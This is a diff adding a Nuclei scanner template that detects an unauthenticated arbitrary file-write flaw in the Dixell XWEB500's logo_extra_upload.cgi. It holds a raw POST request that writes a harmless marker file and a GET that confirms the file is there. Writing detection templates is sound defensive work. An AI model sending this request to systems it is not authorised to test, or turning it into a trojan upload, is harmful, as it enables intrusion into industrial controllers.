@@ -1,0 +1,37 @@
+id: dixell-xweb500-filewrite
+info:
+  name: Dixell XWEB500 logo_extra_upload.cgi File Write Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Dixell XWEB500 has a vulnerability in the logo_extra_upload.cgi API that allows unauthenticated users to write arbitrary files, leading to potential malicious actions like uploading Trojans.
+  tags: file-write, vulnerability
+  reference:
+    - https://github.com/projectdiscovery/nuclei-templates/blob/master/vulnerabilities/other/dixell-xweb500-filewrite.yaml
+    - https://climate.emerson.com
+http:
+  - raw:
+      - |
+        POST /cgi-bin/logo_extra_upload.cgi HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/octet-stream
+
+        abszse.txt\ndixell-xweb500-filewrite
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+  - raw:
+      - |
+        GET /logo/abszse.txt HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "dixell-xweb500-filewrite"
